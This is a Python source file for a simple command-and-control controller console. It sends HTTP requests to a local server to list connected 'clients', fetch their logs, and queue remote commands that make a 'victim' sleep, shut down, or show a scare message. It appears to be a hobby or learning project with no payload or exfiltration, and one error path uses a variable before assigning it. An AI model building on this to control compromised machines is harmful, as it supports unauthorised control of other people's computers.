from typing import Optional
import os
import requests
import re

PLAIN_HEADER = {'Content-Type': 'text/plain'}
SLP_SYN_ERR   = 'Invalid slp syntax, needs two args <client_id> & <n>'
SLP_SYN_ERR_2 = 'Invalid slp syntax, <n> must be a +ve int.'
SHD_SYN_ERR   = 'Invalid shd syntax, requires one arg <client_id>'
PWN_SYN_ERR   = 'Invalid pwn syntax, requires one arg <client_id>'

global exit

# effectively run a simple repl, break once the user enters 'exit'
def run():
    print_home()

    global exit
    exit = False
    while True:
        cmd = input('> ').strip()
        if len(cmd) == 0: 
            continue
        
        handle_command(cmd)
        if exit: 
            break

def text_from_response(response) -> str:
    return f'RET CODE |{response.status_code}|\n\n{response.content.decode()}\n'

def handle_command(cmd):
    ''' Extract all the arguments of the command, if the cmd length is 1 then its 

    '''
    arr = re.sub(pattern='\s+', repl=' ', string=cmd.strip())\
        .split(' ')
    if len(arr) < 1 or len(arr) > 3:
        print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')
        return

    # try match standalone commands such as 'help' or 'clients'
    cmd_id = arr[0]
    if len(arr) == 1:
        handle_helper_cmds(cmd_id)
        return
    
    client_id   = arr[1]
    slp_seconds = arr[2] if len(arr) == 3 else None

    # check the command preconditions so we don't have to at the server or client
    match cmd_id.lower():
        case 'logs':
            response = requests.get(f'http://127.0.0.1:5000/logs/{client_id}')
            print(text_from_response(response))
            return
        case 'slp':
            if len(arr) != 3:             print(SLP_SYN_ERR);  return
            if not slp_seconds.isdigit(): print(SLP_SYN_ERR_2);return
            cmd = f'{cmd_id} {slp_seconds}'
        case 'shd': 
            if len(arr) != 2: print(SHD_SYN_ERR); return
            cmd = cmd_id
        case 'pwn': 
            if len(arr) != 2: print(PWN_SYN_ERR); return
            cmd = cmd_id
        case _: 
            print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')
            return

    response = requests.post(f'http://127.0.0.1:5000/commands/{client_id}', data=cmd, headers=PLAIN_HEADER)
    print(text_from_response(response))

def handle_helper_cmds(cmd_id):
    ' Handle the helper controller-side commands. Returns true if the command was exit! '
    global exit
    match cmd_id.lower():
        case 'help': print_home()
        case 'exit': exit = True
        case 'clear': os.system('cls')
        case 'clients':
            response = requests.get(f'http://127.0.0.1:5000/clients')
            print(text_from_response(response))
        case _: 
            print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')


def print_home():
    print('''
           ________________________________
         /                                  \\
        {   Welcome To Your C2 Controller!   }
         \\ ________________________________ /

    Commands to retrieve information:
      1) clients
          - Performs GET /clients to retrieve client id list.
      2) logs <client_id>
          - Performs GET /logs/<client_id> to retrieve logs for a specific client.

    List of remote commands:
      1) slp <client_id> <num_of_seconds>
          - Make the victim sleep for n seconds.
      2) shd <client_id>
          - Terminate execution of client program.
      3) pwn <client_id>
          - Display a simple messsage to the victim to scare them.

    Local commands:
      1) 'help' to display this page again!
      2) 'clear' to clear the terminal window.
      3) 'exit' to close current session.
    ''')


if __name__ == '__main__':
    run()